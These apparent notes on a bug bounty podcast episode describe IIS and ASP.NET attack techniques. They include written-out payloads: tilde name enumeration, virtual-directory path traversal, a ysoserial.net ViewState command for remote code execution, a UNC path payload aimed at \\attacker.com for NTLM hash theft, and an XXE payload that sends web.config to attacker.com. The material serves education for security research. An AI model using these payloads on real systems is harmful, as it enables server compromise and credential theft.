# EP30: Shubs on Recon, Deep Diving, AssetNote & IIS Hacking - Client-Side Security Notes

## Metadata
- **Guests:** Shubs (infosec_au) - Founder of AssetNote, Justin Gardner (@rhynorater), Joel Margolis (teknogeek)
- **Date:** ~August 2023 (based on Metabase RCE disclosure timeline and Citrix CVE references)
- **Episode Link:** Critical Thinking Bug Bounty Podcast - Episode 30
- **Primary Topic:** Shubs' hacking journey, reconnaissance philosophy, AssetNote research, CVE reversing, zero-day economics, IIS/ASP.NET exploitation techniques

---

## Client-Side Content Assessment

**This episode contains MINIMAL direct client-side hacking content.** The bulk of the episode covers reconnaissance philosophy, bug bounty economics, zero-day disclosure ethics, CVE reversing methodology, and entrepreneurship advice. However, Shubs shares several IIS/ASP.NET exploitation techniques that have indirect relevance to client-side attack chains (SSRF escalation, XXE file disclosure, path traversal via virtual directories). These are documented below.

The episode also briefly references deep JavaScript analysis on Uber's React/GraphQL stack and GraphQL schema brute-forcing, but does not provide specific client-side exploitation techniques for those.

---

## Technique: IIS Short Name (8.3/Tilde) Enumeration

### How It Works

IIS servers support legacy 8.3 filename format (Windows short names). An attacker can brute-force partial file and directory names character by character using wildcard requests. The server responds differently (200 vs 404) depending on whether a partial match exists, allowing enumeration of file/directory names even when directory listing is disabled.

```
# The attack sends requests like:
GET /a*~1.*    --> 404 (no file starting with 'a')
GET /s*~1.*    --> 200 (a file starting with 's' exists!)
GET /se*~1.*   --> 200 (file starts with 'se')
GET /sec*~1.*  --> 200 (file starts with 'sec')
GET /secr*~1.* --> 200 (file starts with 'secr')
GET /secre*~1.* --> 200 (matches 'secret')
GET /secret~1.* --> 200 (short name confirmed: SECRET~1)

# You now know a file/directory starting with "secret" exists
# Fuzz the rest with wordlists to get full name
```

```
Attacker                        IIS Server
   |                                |
   |-- GET /x*~1.* -------------->  |
   |                                |-- Check 8.3 name table
   |  <-- 404 Not Found ---------- |   (no match)
   |                                |
   |-- GET /s*~1.* -------------->  |
   |                                |-- Check 8.3 name table
   |  <-- 200 OK (or diff resp) -- |   (match found!)
   |                                |
   |   [Continue character by       |
   |    character enumeration]      |
```

### Why This Works

Windows NTFS stores both the full filename and a legacy 8.3 short name (e.g., `SECRET~1.BAK` for `secretbackup.bak`). IIS exposes this behavior through wildcard matching on the tilde (`~`) character. This has existed for 10+ years and, as Shubs states, still works on the latest version of IIS with no indication Microsoft plans to fix it.

### Where To Apply This

- Any IIS server you encounter (look for the default IIS blue page, `Server: Microsoft-IIS` header)
- Use tools like **Shortscan** (by bitquark) for automated enumeration
- Combine discovered short names with wordlist fuzzing to recover full file/directory names
- Works through IIS virtual directory proxying (see path traversal technique below) -- you can enumerate files on backend servers too

---

## Technique: IIS Virtual Directory Path Traversal to Backend Servers

### How It Works

IIS virtual directories can map URL paths to different backend servers. When a virtual directory like `/sso` maps to `10.1.1.1/sso`, a path traversal using encoded slashes can escape the `/sso` sub-path on the backend and reach its document root.

```
# IIS configuration (simplified):
# Virtual Directory: /sso  -->  http://10.1.1.1/sso

# Normal request:
GET /sso/login HTTP/1.1
# Routes to: http://10.1.1.1/sso/login

# Path traversal using encoded slash (%2f):
GET /sso.%2f HTTP/1.1
# Routes to: http://10.1.1.1/  (document root!)

# Now you can brute-force the backend doc root:
GET /sso.%2fadmin HTTP/1.1
# Routes to: http://10.1.1.1/admin
```

```
Attacker                    IIS (Reverse Proxy)              Backend (10.1.1.1)
   |                              |                                |
   |-- GET /sso.%2f ---------->   |                                |
   |                              |-- Resolves virtual dir /sso    |
   |                              |-- Decodes %2f to /             |
   |                              |-- Forwards: GET / ---------->  |
   |                              |                                |-- Serves doc root
   |  <-- Backend doc root ------ | <-- Response ----------------- |
   |                              |                                |
   |   [Brute-force from here     |                                |
   |    using /sso.%2f<path>]     |                                |
```

### Why This Works

IIS processes the virtual directory mapping before fully normalizing encoded path characters. The `.%2f` (dot + encoded forward slash) tricks IIS into traversing up from the mapped sub-path on the backend server. This is similar to Sam Curry's "secondary context" path traversal research, but specific to IIS virtual directory configurations.

### Where To Apply This

- Complex IIS deployments with multiple virtual directories (common in enterprise environments)
- Look for paths like `/sso`, `/api`, `/app` that might be virtual directory mappings
- Test with `.%2f`, `..%2f`, `%2f..%2f` after the virtual directory path segment
- Once you reach the backend doc root, use IIS short name enumeration (tilde technique) to discover files -- Shubs confirms this works through the virtual directory proxy
- Enterprise SSO portals, SharePoint environments, and legacy .NET applications are prime targets

---

## Technique: IIS/ASP.NET Web.config Machine Key to RCE

### How It Works

If you achieve any form of local file disclosure (LFI, XXE, SSRF to file://) on an IIS/.NET application, reading the `web.config` file gives you the machine key and validation key. These cryptographic keys can be used to forge ViewState payloads containing serialized .NET objects, leading to remote code execution via deserialization.

```
# Step 1: Achieve file disclosure (LFI, XXE, SSRF, etc.)
# Read: C:\inetpub\wwwroot\web.config

# web.config contains:
<machineKey
  validationKey="ABC123..."
  decryptionKey="DEF456..."
  validation="SHA1"
  decryption="AES" />

# Step 2: Use ysoserial.net to generate malicious ViewState
# The machine key lets you sign/encrypt a payload that the
# server will trust and deserialize

ysoserial.exe -p ViewState \
  -g TextFormattingRunProperties \
  -c "cmd /c whoami > C:\inetpub\wwwroot\output.txt" \
  --validationkey="ABC123..." \
  --decryptionkey="DEF456..." \
  --validationalg="SHA1" \
  --decryptionalg="AES" \
  --path="/vulnerable.aspx" \
  --apppath="/" \
  --islegacy
```

```
Attacker                          IIS/.NET Server
   |                                    |
   |-- [LFI/XXE/SSRF] read ----------> |
   |   web.config                       |
   |  <-- machineKey, validationKey --- |
   |                                    |
   |-- [Generate forged ViewState       |
   |    with ysoserial.net]             |
   |                                    |
   |-- POST /page.aspx --------------> |
   |   __VIEWSTATE=<forged_payload>     |
   |                                    |-- Validates signature (PASS)
   |                                    |-- Deserializes payload
   |                                    |-- Executes command
   |  <-- RCE achieved! --------------- |
```

### Why This Works

ASP.NET uses the machine key to cryptographically sign and optionally encrypt ViewState data. If an attacker obtains these keys, they can forge a ViewState containing a malicious serialized .NET gadget chain. The server trusts the signature, deserializes the payload, and executes arbitrary code. Shubs notes that 90% of the time, companies store these keys in `web.config` rather than the Windows registry (the more secure option).

### Where To Apply This

- Any .NET/IIS application where you have file read capabilities
- Chain with XXE, LFI, SSRF, or backup file disclosure
- The `web.config` file is almost always at the application root
- Multiple shell formats available as fallback: `.aspx`, `.ashx`, `.ascx`, `web.config` (yes, `web.config` itself can be a webshell)

---

## Technique: SSRF to NTLM Hash Theft via Windows UNC Paths

### How It Works

When an SSRF exists on a Windows/.NET/IIS server and the application uses `Path.Join()` or similar Windows path APIs, you can supply a UNC path (Windows share path) instead of an HTTP URL. Windows will automatically attempt to authenticate to the remote share, leaking the server's Net-NTLM hash.

```csharp
// Vulnerable .NET code example:
string userInput = Request.QueryString["file"];
string fullPath = Path.Join("/uploads/", userInput);
// Developer expects: /uploads/report.pdf
// Attacker sends:    \\attacker.com\share\evil

// Path.Join produces: \\attacker.com\share\evil
// Windows API makes SMB connection to attacker.com
// Automatically sends Net-NTLM authentication hash
```

```
Attacker (running Responder)        IIS/.NET Server
   |                                      |
   |-- SSRF request: -------------------> |
   |   ?file=\\attacker.com\share\x       |
   |                                      |
   |                                      |-- Path.Join("/uploads/",
   |                                      |   "\\attacker.com\share\x")
   |                                      |-- Windows resolves UNC path
   |                                      |
   |  <== SMB Auth (Net-NTLM hash) ===== |
   |                                      |
   |-- [Crack hash offline with           |
   |    hashcat/john]                     |
   |                                      |
   |-- OR relay hash to other             |
   |    internal services                 |
```

### Why This Works

Windows APIs treat UNC paths (`\\server\share`) as network resources and automatically attempt NTLM authentication when accessing them. When a .NET application uses `Path.Join()` with attacker-controlled input, the backslash prefix triggers Windows SMB behavior instead of HTTP. The server's machine account or service account Net-NTLM hash is sent to the attacker's server, where tools like Responder capture it. This escalates a simple SSRF from "can make HTTP requests" to "credential theft + potential lateral movement."

### Where To Apply This

- Any SSRF on Windows/.NET/IIS servers
- Specifically look for file-path-based SSRFs (not just URL-based)
- Use `\\attacker-ip\share` or `\\attacker-domain\share` as the payload
- Run Responder or ntlmrelayx on your attacker server to capture hashes
- Captured hashes can be cracked offline or relayed to other services (NTLM relay attacks)
- This turns a potentially "low impact" SSRF into a critical finding

---

## Technique: XXE with Windows Built-in DTD for File Disclosure

### How It Works

When exploiting XML External Entity (XXE) injection on Windows/.NET/IIS servers, there is a universal DTD file present on all Windows systems that can be referenced to achieve out-of-band file exfiltration. This bypasses scenarios where direct entity expansion is blocked but parameter entities using local DTDs work.

```xml
<!-- The technique leverages a DTD file that exists on every
     Windows installation. Shubs describes this as "universal
     for Windows" and states it works "nine times out of 10"
     to leak file contents when you probably shouldn't be able to.

     The general approach uses a local Windows DTD to redefine
     entities and exfiltrate data via out-of-band channels: -->

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///C:/Windows/System32/wbem/xml/cim20.dtd">
  <!-- Or other known Windows DTD paths -->

  <!-- Redefine an entity from the local DTD to inject
       your own malicious entity definitions -->
  <!ENTITY % SuperClass '>
    <!ENTITY &#x25; file SYSTEM "file:///C:/inetpub/wwwroot/web.config">
    <!ENTITY &#x25; exfil SYSTEM "http://attacker.com/?data=&#x25;file;">
    &#x25;exfil;
  <!ELEMENT xx "'>

  %local_dtd;
]>
<foo>&xxe;</foo>
```

### Why This Works

Many XXE defenses or parser configurations block external DTD loading from remote URLs but still allow references to local filesystem DTDs. Since Windows ships with known DTD files at predictable paths, attackers can reference these local DTDs and redefine their internal entities to perform file exfiltration. This is a well-known technique (local DTD repurposing) but the Windows-specific DTD paths make it "universal" for any Windows target.

### Where To Apply This

- Any XXE vulnerability on a Windows server where standard XXE payloads are blocked
- The DTD file paths are consistent across Windows versions
- Especially useful when the XML parser blocks remote DTD loading but allows local filesystem access
- Chain with the web.config machine key technique above: XXE to read web.config, then forge ViewState for RCE

---

## Technique: GraphQL Schema Brute-Forcing for IDOR Chains

### How It Works

Shubs briefly describes brute-forcing GraphQL schemas on Uber to discover hidden queries and mutations that expose user data. While not purely client-side, this technique is executed from the browser/client and targets the GraphQL API surface.

```
# GraphQL introspection may be disabled, but you can still
# brute-force field names and query/mutation names:

# Step 1: Brute-force query names
POST /graphql
{"query": "{ getUser { id } }"}          --> "Cannot query field 'getUser'"
{"query": "{ fetchUser { id } }"}        --> "Cannot query field 'fetchUser'"
{"query": "{ userByUUID { id } }"}       --> Returns data!

# Step 2: Enumerate fields on discovered types
{"query": "{ userByUUID(id:\"xxx\") { email } }"}  --> "Cannot query field"
{"query": "{ userByUUID(id:\"xxx\") { pii } }"}    --> Returns PII!

# Step 3: Chain with IDOR
# Find a query that converts email/username -> UUID
# Then use UUID in other queries to access PII
```

```
Attacker                            GraphQL API
   |                                     |
   |-- Find email-to-UUID query -------> |
   |  <-- UUID for victim -------------- |
   |                                     |
   |-- Use UUID in PII query ----------> |
   |  <-- Full PII response ------------ |
   |                                     |
   |   [Chain: username -> UUID -> PII   |
   |    All via GraphQL mutations/queries]|
```

### Why This Works

Even when GraphQL introspection is disabled, the error messages from invalid field names versus valid field names differ, enabling brute-force discovery. Once hidden queries/mutations are found, they often lack proper authorization checks, allowing IDOR-style access to other users' data.

### Where To Apply This

- Any GraphQL API (check for `/graphql`, `/gql`, `/api/graphql` endpoints)
- Use tools like graphql-cop, clairvoyance, or custom wordlists
- Shubs describes building a POC where you "enter the name of the person you want all the PII for" -- the chain goes: name -> user list -> select user -> UUID -> PII
- Particularly effective on mature applications that have migrated to GraphQL but left legacy queries accessible

---

## Technique: Strategically Sitting on Open Redirects and IDORs

### How It Works

This is a bug bounty strategy technique rather than a pure exploit. Shubs explicitly states he will skip reporting certain bug classes (open redirects, IDORs that leak UUIDs) in order to chain them into higher-impact reports later.

```
# Instead of reporting an open redirect standalone:
https://target.com/redirect?url=https://evil.com
# (Might be closed as informational or low severity)

# Sit on it and chain later:
# Open Redirect + OAuth flow = Account Takeover
# IDOR leaking UUID + Another IDOR using UUID = Full PII dump

# Shubs' example with Uber:
# Step 1: Find IDOR that converts email/username -> UUID (don't report)
# Step 2: Find IDOR that uses UUID to leak PII (report BOTH as one chain)
# Result: "Enter the name of the person you want all the PII for"
```

### Why This Works

Individual bugs may have low impact when reported alone. Open redirects are often closed as informational. IDORs leaking non-sensitive identifiers (UUIDs) are often downgraded. By holding these "gadget" bugs and chaining them with future findings, the combined report demonstrates significantly higher impact and receives a higher bounty.

### Where To Apply This

- Open redirects that are in OAuth/SSO flows (potential account takeover chain)
- IDORs that leak identifiers needed for other IDORs
- Any bug that serves as a prerequisite step in a more complex attack chain
- Reference previous private reports when chaining (Joel's advice: "see report #XXXXX for UUID leak")

---

## Summary Table

| # | Technique | Type | Impact | Complexity |
|---|-----------|------|--------|------------|
| 1 | IIS Short Name (Tilde) Enumeration | Information Disclosure | Medium - reveals partial file/dir names | Low |
| 2 | IIS Virtual Directory Path Traversal | Access Control Bypass / Path Traversal | High - access backend server doc roots | Low-Medium |
| 3 | Web.config Machine Key to RCE | Remote Code Execution | Critical - full server compromise | Medium |
| 4 | SSRF to NTLM Hash via UNC Paths | Credential Theft | High-Critical - credential theft, lateral movement | Low |
| 5 | XXE with Windows Built-in DTD | File Disclosure | High - arbitrary file read on Windows | Medium |
| 6 | GraphQL Schema Brute-Force for IDOR | Information Disclosure / IDOR | High - PII exfiltration via chained IDORs | Medium |
| 7 | Sitting on Open Redirects/IDORs for Chains | Strategy / Bug Bounty Economics | Variable - increases impact of future reports | N/A |

---

## Key Quotes

> "The second you see an IIS server, you should thank God because it's the easiest thing to hack out of all the other web servers that are out there. You should be grateful." -- Shubs

> "Which other web server technology lets you guess partial files and folder names? There's nothing out there like that. That's just ridiculous. And this vulnerability has existed for like 10 years plus." -- Shubs, on IIS short name enumeration

> "If you get local file disclosure and you read a web.config file, it has the machine key, the validation key, you're able to escalate that from just that to command execution." -- Shubs

> "That SSRF on an IIS server on a .NET product is much more than just reaching a web server nine times out of 10. If they're using Path.Join, then in Path.Join, you can just do backslash, and put in like a Windows share... Windows willingly shares the Net-NTLM hash with your server." -- Shubs

> "When you see the blue page on IIS, do not skip it, please. There's something there. There's no reason they've just spun up an IIS server for no reason." -- Shubs

> "When you drop shells in IIS and .NET, you can drop shells with web.config, with ASCX files, with ASHX files, with ASPX files. You can drop shells in so many different ways." -- Shubs

> "If you explicitly say that something is a zero day in your report, you're less likely to be paid. If you don't include those words, 90% of the time, they pay you, surprisingly." -- Shubs, on zero-day reporting strategy

> "Things like open redirects or IDORs specifically are major things that I will decide to skip reporting in lieu of a future report." -- Shubs, on strategic bug chaining

> "The more time I spent in Uber, the more necessary it was to get deeper and deeper into the application stack. And if I wanted to find more vulnerabilities, I had to get comfortable with things that most people can sometimes be uncomfortable with, which is really deep JavaScript analysis work." -- Shubs

---

## Resources & References

| Resource | Description |
|----------|-------------|
| [@infosec_au](https://twitter.com/infosec_au) | Shubs' Twitter/X account |
| [AssetNote](https://assetnote.io) | Attack surface management platform founded by Shubs |
| [AssetNote Blog](https://blog.assetnote.io) | Zero-day research and vulnerability write-ups |
| Shortscan (bitquark) | IIS short name enumeration tool |
| [Responder](https://github.com/lgandx/Responder) | NTLM hash capture tool for SSRF-to-hash-theft chains |
| [ysoserial.net](https://github.com/pwntester/ysoserial.net) | .NET deserialization payload generator (for ViewState/machine key exploitation) |
| Sam Curry's Secondary Context Research | Path traversal research referenced by Shubs for IIS virtual directory technique |
| Metabase Pre-Auth RCE | Upcoming (at time of recording) AssetNote research with multi-trick exploit chain |
| Aspera Faspex Research | AssetNote research that led to 40 pre-auth RCEs across enterprise divisions |
| IntelliJ (Community Edition) | IDE used by AssetNote for Java debugging/reversing |
| JetBrains Rider | IDE used by AssetNote for .NET debugging/reversing |
